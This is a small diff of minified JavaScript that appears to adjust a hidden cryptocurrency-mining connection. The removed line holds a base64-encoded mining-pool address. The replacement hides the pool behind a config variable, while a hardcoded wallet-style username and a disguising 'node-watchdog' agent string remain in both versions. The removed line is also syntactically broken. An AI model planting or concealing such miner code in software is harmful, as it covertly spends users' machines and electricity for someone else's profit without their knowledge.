@@ -1714,7 +1714,7 @@
             h = 0,
             l = "";
         const d = {
-                url: `${e.SERVER_WS}/${cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==}`,
+                url: `${e.SERVER_WS}/${e.SERVER_TARGET}`,
                 username: '85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr',
                 password: e.SERVER_SECRET,
                 agent: "node-watchdog/1.0.0",
